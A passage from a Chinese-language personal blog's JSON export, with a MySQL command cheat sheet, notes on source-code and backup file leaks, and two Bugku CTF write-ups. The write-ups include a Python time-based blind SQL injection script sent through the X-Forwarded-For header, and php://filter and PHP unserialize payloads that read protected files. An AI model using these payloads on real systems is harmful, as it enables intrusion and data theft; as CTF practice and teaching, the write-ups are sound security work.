数据库的基本操作","slug":"mysql-数据库的基本操作","date":"2018-10-08T16:21:17.000Z","updated":"2019-05-29T12:33:43.168Z","comments":true,"path":"2018/10/09/mysql-数据库的基本操作/","link":"","permalink":"http://yoursite.com/2018/10/09/mysql-数据库的基本操作/","excerpt":"mysql 数据库的操作","text":"mysql 数据库的操作 一些常用的命令1.增加一个字段 alter table 表名字 add COLUMN 新列名 VARCHAR(20) DEFAULT NULL; //增加一个字段，默认为空 alter table user add COLUMN new2 VARCHAR(20) NOT NULL; //增加一个字段，默认不能为空 2.删除一个字段 alter table 表名字 DROP COLUMN 要删除的列名; //除一个字段 3.修改一个字段 alter table user MODIFY new1 VARCHAR(10); //修改一个字段的类型 alter table user CHANGE new1 new4 int; //修改一个字段的名称，此时一定要重新 //主键 alter table tabelname add new_field_id int(5) unsigned default 0 not null auto_increment ,add primary key (new_field_id); //增加一个新列 alter table t2 add d timestamp; alter table infos add ex tinyint not null default ‘0′; //删除列 alter table t2 drop column c; //重命名列 alter table t1 change a b integer; //改变列的类型 alter table t1 change b b bigint not null; alter table infos change list list tinyint not null default ‘0′; //重命名表 alter table t1 rename t2; 加索引 mysql&gt; alter table tablename change depno depno int(5) not null; mysql&gt; alter table tablename add index 索引名 (字段名1[，字段名2 …]); mysql&gt; alter table tablename add index emp_name (name); 加主关键字的索引 mysql&gt; alter table tablename add primary key(id); 加唯一限制条件的索引 mysql&gt; alter table tablename add unique emp_name2(cardnumber); 删除某个索引 mysql&gt;alter table tablename drop index emp_name; 增加字段： mysql&gt; ALTER TABLE table_name ADD field_name field_type; 修改原字段名称及类型： mysql&gt; ALTER TABLE table_name CHANGE old_field_name new_field_name field_type; 删除字段： mysql&gt; ALTER TABLE table_name DROP field_name; mysql修改字段长度 alter table 表名 modify column 字段名 类型; 例如 数据库中user表 name字段是varchar(30) 可以用 alter table user modify column name varchar(50) ; 数据库的操作 net stop mysql //关闭msql net start mysql //开启mysql mysql -uroot -proot //登陆mysql show databases； //查看数据库 use test //切换到test数据库 show tables； //查看所有表 select * from user； //查看表中数据 desc user； //查看表结构 exit； //退出mysql客户端 create database user； //创建数据库 use user； //切换数据库 drop database user； //删除数据库 创建表： create table user（ id int， name varchar（30）， pass varchar（30） ); rename table user to user1; //修改表名 drop table user1 //删除表 insert into user(id) values(&quot; &quot;) select count(*) from user; 查询数据的总行数 asc是表示升序，desc表示降序 exit; 退出 select database(); 查询现在所在的库的名字； select vresion()； 查询Mysql的版本信息； select User(); 查询使用者的权限； select @@datadir; 查询Mysql的存储位置；","categories":[],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"文件泄露","slug":"文件泄露","date":"2018-09-08T06:13:02.000Z","updated":"2019-06-05T09:01:46.733Z","comments":true,"path":"2018/09/08/文件泄露/","link":"","permalink":"http://yoursite.com/2018/09/08/文件泄露/","excerpt":"文件泄露前言文件泄露大多数是因为程序员操作不当而引起的","text":"文件泄露前言文件泄露大多数是因为程序员操作不当而引起的 .git源码泄漏原因在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 .DS_Store文件泄漏原因.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。 .hg源码泄漏原因hg是类似于git的一种分布式管理，hg初始化的时候会生成hg文件， 编辑器临时文件泄露vim编辑器vim临时文件程序员使用vim编辑器编写一个index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php。 恢复文件： 前提是.index.php.swp存在于该目录下 vim -r 恢复的文件名 vim备份文件默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；例如：index.php的备份文件则为index.php~ PHPSTORM使用phpstorm新建项目时，会生成一个.idea文件夹，这个文件夹有一个workspace.xml，访问可以得到一些信息。 网站源码备份文件泄露www.rar/nyist.tar.gz/web.zip等压缩文件名","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"bugku insert into 注入","slug":"bugku-insert-into-注入","date":"2018-05-10T15:42:22.000Z","updated":"2019-05-29T12:42:44.067Z","comments":true,"path":"2018/05/10/bugku-insert-into-注入/","link":"","permalink":"http://yoursite.com/2018/05/10/bugku-insert-into-注入/","excerpt":"INSERT INTO 注入","text":"INSERT INTO 注入 打开题目 已经给出源码 error_reporting(0); function getIp(){ $ip = &#39;&#39;; if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])){ $ip = $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; }else{ $ip = $_SERVER[&#39;REMOTE_ADDR&#39;]; } $ip_arr = explode(&#39;,&#39;, $ip); return $ip_arr[0]; } $host=&quot;localhost&quot;; $user=&quot;&quot;; $pass=&quot;&quot;; $db=&quot;&quot;; $connect = mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;); mysql_select_db($db) or die(&quot;Unable to select database&quot;); $ip = getIp(); echo &#39;your ip is :&#39;.$ip; $sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;; mysql_query($sql); 这里可以看出注入点在最后的 $sql=&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;; ` $ip 可以通过 X-ForWarded-For 伪造IP 来进行http头注入 由于没有回显 也屏蔽了报错 所以只能考虑基于时间的盲注 之前时间延时盲注都是用的 if(exp1,exp2,exp3) 但是这次 他将’,’ 过滤了 $ip_arr = explode(&#39;,&#39;, $ip); return $ip_arr[0]; 所以用 case when exp1 then sleep(4) else 1 end来绕过 “,”的限制 exp1 中要用到substr来进行剪切，这个函数substr(str,1,1) 又是存在 “,” , 于是这里我又用 substr (str) from 1 for 1 来绕过 “,”的限制 构成的完整语句为 insert into client_ip (ip) values (&#39; 1&#39; and (case when (length((select database())) = 14) then sleep(4) else 1 end) # &#39;) 最后附上脚本： import requests url=&quot;http://123.206.87.240:8002/web15/&quot; flag=&quot;&quot; for i in range(1,6): for str1 in &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,!@#$%^&amp;*``.&quot;: #data = &quot;11&#39;and (case when (substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot; #client_ip,flag #data = &quot;11&#39; and (case when (substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot; #flag data = &quot;11&#39; and (case when (substr((select group_concat(flag) from flag) from &quot; + str(i) + &quot; for 1 )=&#39;&quot; + str1 + &quot;&#39;) then sleep(4) else 1 end )) #&quot; headers={&#39;X-ForWarded-For&#39;:data} try: result=requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag+=str1 print flag break print flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]},{"title":"bugku welcome to the bugkuctf wp","slug":"bugku-welcome-to-the-bugkuctf-wp","date":"2018-05-08T15:42:22.000Z","updated":"2019-06-05T09:01:59.050Z","comments":true,"path":"2018/05/08/bugku-welcome-to-the-bugkuctf-wp/","link":"","permalink":"http://yoursite.com/2018/05/08/bugku-welcome-to-the-bugkuctf-wp/","excerpt":"welcome to the bugkuctf","text":"welcome to the bugkuctf 点击连接 之后查看源码 发现 you are not the number of bugku ! &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; 发现了需要get传递三个参数 $_GET[‘txt’] === $user === “welcome to the bugkuctf” $file = hint.php 就想到了 php伪协议 文件包含漏洞 GET /test1/index.php? txt=php://input &amp;file=php://filter/read=convert.base64-encode/resource=hint.php &amp;password= POST welcome to the bugkuctf 可以读出来 hint.php &lt;?php class Flag{ //flag.php public $file; public function __tostring(){ if(isset($this-&gt;file)){ echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); } } } ?&gt; 同理 也可以读出index.php的代码 &lt;?php $txt = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $password = $_GET[&quot;password&quot;]; if(isset($txt)&amp;&amp;(file_get_contents($txt,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello friend!&lt;br&gt;&quot;; if(preg_match(&quot;/flag/&quot;,$file)){ echo &quot;?????????????????????flag???&quot;; exit(); }else{ include($file); $password = unserialize($password); echo $password; } }else{ echo &quot;you are not the number of bugku ! &quot;; } ?&gt; &lt;!-- $user = $_GET[&quot;txt&quot;]; $file = $_GET[&quot;file&quot;]; $pass = $_GET[&quot;password&quot;]; if(isset($user)&amp;&amp;(file_get_contents($user,&#39;r&#39;)===&quot;welcome to the bugkuctf&quot;)){ echo &quot;hello admin!&lt;br&gt;&quot;; include($file); //hint.php }else{ echo &quot;you are not admin ! &quot;; } --&gt; hint.php 提示的flag.php 从index.php可以看到对关键词flag进行了preg_match 所以不能直接读出代码内容 hint.php 定义的是一个类 注意到中间有一个__tostring方法， 这个函数就是把类当作字符串执行时会自动执行的一个函数。 __tostring 方法执行时，将变量$file作为文件名输出文件内容，结合提示flag.php，猜测屏蔽的flag.php文件在此打开 将hint.php中的Flag方法当做字符串执行时，会自动执行__tostring方法，只有echo，只能输出一个或多个字符串，所以构造password为Flag类型，其中的string变量flie=flag.php即可 看到了代码中有 include($file); $password = unserialize($password); echo $password; 因此知道需要构造序列化对象payload为 GET /test1/index.php?txt=php://input &amp;file=hint.php &amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;} POST welcome to the bugkuctf 就可得到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/tags/writeup/"}]}]}